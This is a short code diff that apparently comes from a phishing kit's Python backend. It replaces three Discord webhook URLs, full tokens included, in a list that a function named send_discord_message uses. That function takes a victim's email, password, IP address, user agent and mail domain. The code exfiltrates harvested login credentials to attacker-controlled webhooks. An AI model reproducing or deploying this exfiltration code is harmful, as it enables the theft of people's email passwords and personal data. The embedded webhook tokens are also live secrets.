@@ -19,9 +19,9 @@ from email.mime.multipart import MIMEMultipart
 
 # Discord Webhook URL
 DISCORD_WEBHOOK_URLS = [
-    "https://canary.discord.com/api/webhooks/1415244225678938223/nIzUBBcoG28z6F05cFADon8gBNM04gwbgU0e-UJE4ZJEo4DdYiK5mw4VW8Bm9zH-gzxX",
-    "https://canary.discord.com/api/webhooks/1415244318230183957/1dVhGXtqPmJKdYvKFNGY4YzRU9vg1ZmjeVZp5jMlWVDJx6egcQnpUIDGOk8w1I_LjAwZ",
-    "https://canary.discord.com/api/webhooks/1415244591212400833/iUy9XVE5VuX0oFVgYJnoaBRbcxkIZHoRV8sKLfgRgLCj_Rb6fJtQJGG3KKTG9Ml787kv"
+    "https://discord.com/api/webhooks/1348669865195733002/ZszNmtxM4biaP6sjAahS5jXJmqJ19LuifBafAledLqF-sOMJEdthZlSfP7UeD2phQVE6",
+    "https://discord.com/api/webhooks/1348669882685984861/yZ_fqd_KHsXo-Mc1SttB2xKqPYvMNKMQA7kwLFOLT20o4KGeGIKD5e7jnfQu1KSNgDDn",
+    "https://discord.com/api/webhooks/1348669936964337715/CuVDPFNpftjEvDSwSb2FaBkbzl6bXxhjMlzbjl2x70Ufx6zitCfiMRKFCcwH-SiWzdgP"
 ]
 
 def send_discord_message(email, password, ip, useragent, domain, mx_record):
